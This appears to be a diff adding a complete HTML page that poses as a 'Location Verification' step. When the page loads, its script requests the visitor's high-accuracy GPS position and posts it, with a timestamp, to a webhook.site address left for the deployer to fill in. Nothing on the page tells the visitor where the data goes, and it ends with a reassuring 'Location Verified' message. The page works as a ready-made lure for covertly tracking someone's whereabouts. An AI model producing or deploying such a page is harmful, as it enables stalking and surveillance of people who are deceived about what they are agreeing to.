@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background-color: #f0f2f5;
+      color: #333;
+    }
+    h2 {
+      color: #007bff;
+    }
+    p {
+      font-size: 1.1em;
+    }
+    .container {
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      padding: 30px;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Verifying Your Device Location...</h2>
+    <p>Please tap “Allow” if your browser prompts you to confirm your current location.</p>
+  </div>
+
+  <script>
+    function sendLocation(lat, lon) {
+      // IMPORTANT: Replace the URL below with your actual webhook URL
+      const webhookUrl = "https://webhook.site/YOUR_UNIQUE_ID"; 
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          timestamp: new Date().toISOString()
+        })
+      });
+    }
+
+    function handleSuccess(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      sendLocation(lat, lon);
+      document.querySelector('.container').innerHTML = "<h2>Location Verified ✅</h2><p>Thank you! You may now close this page.</p>";
+    }
+
+    function handleError(error) {
+      let errorMessage = "An unknown error occurred.";
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          errorMessage = "Location access was denied. Please enable location permissions in your browser settings.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          errorMessage = "Location information is currently unavailable.";
+          break;
+        case error.TIMEOUT:
+          errorMessage = "The request to get user location timed out.";
+          break;
+      }
+      document.querySelector('.container').innerHTML = `<h2>Error ❌</h2><p>${errorMessage}</p>`;
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(handleSuccess, handleError, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      } else {
+        document.querySelector('.container').innerHTML = "<h2>Unsupported Browser</h2><p>Your device’s browser does not support location access.</p>";
+      }
+    }
+
+    // Run the location function when the page loads
+    window.onload = getLocation;
+  </script>
+</body>
+</html>
